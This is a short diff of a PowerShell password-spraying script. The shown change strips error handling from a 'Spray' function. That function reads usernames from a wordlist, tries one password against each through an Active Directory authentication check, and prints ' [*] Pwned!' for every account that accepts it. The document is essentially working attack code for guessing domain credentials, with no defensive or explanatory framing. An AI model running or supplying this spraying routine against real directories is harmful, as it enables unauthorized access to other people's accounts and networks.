@@ -6,17 +6,10 @@ Function Test-ADAuth {
 
 function Spray {
     param ($pass, $wordlist)
-    try{
     foreach ($uname in [System.IO.File]::ReadLines($wordlist)){
     if (Test-ADAuth -username $uname -password $pass)
     {
         echo $uname ' [*] Pwned!'
     }
-     catch 
-    {
-        Write-Output "$PSItem"
-    }
 }
-}
-finally {}
 }
